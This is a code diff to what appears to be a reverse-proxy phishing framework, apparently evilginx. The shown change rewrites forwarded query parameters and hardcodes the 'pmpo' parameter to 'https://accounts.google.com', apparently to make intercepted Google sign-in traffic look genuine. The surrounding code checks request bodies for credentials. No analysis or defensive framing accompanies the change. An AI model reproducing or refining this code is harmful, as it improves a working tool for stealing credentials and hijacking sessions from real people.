@@ -641,18 +641,38 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
+				// // patch GET query params with original domains
+				// if pl != nil {
+				// 	qs := req.URL.Query()
+				// 	if len(qs) > 0 {
+				// 		for gp := range qs {
+				// 			for i, v := range qs[gp] {
+				// 				qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
+				// 			}
+				// 		}
+				// 		req.URL.RawQuery = qs.Encode()
+				// 	}
+				// }
+
 				// patch GET query params with original domains
 				if pl != nil {
 					qs := req.URL.Query()
 					if len(qs) > 0 {
 						for gp := range qs {
 							for i, v := range qs[gp] {
-								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
+								if gp == "pmpo" {
+									// Modify the 'pmpo' parameter value
+									qs[gp][i] = "https%3A%2F%2Faccounts.google.com"
+								} else {
+									// Apply the patchUrls function to other parameters
+									qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
+								}
 							}
 						}
 						req.URL.RawQuery = qs.Encode()
 					}
 				}
+
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
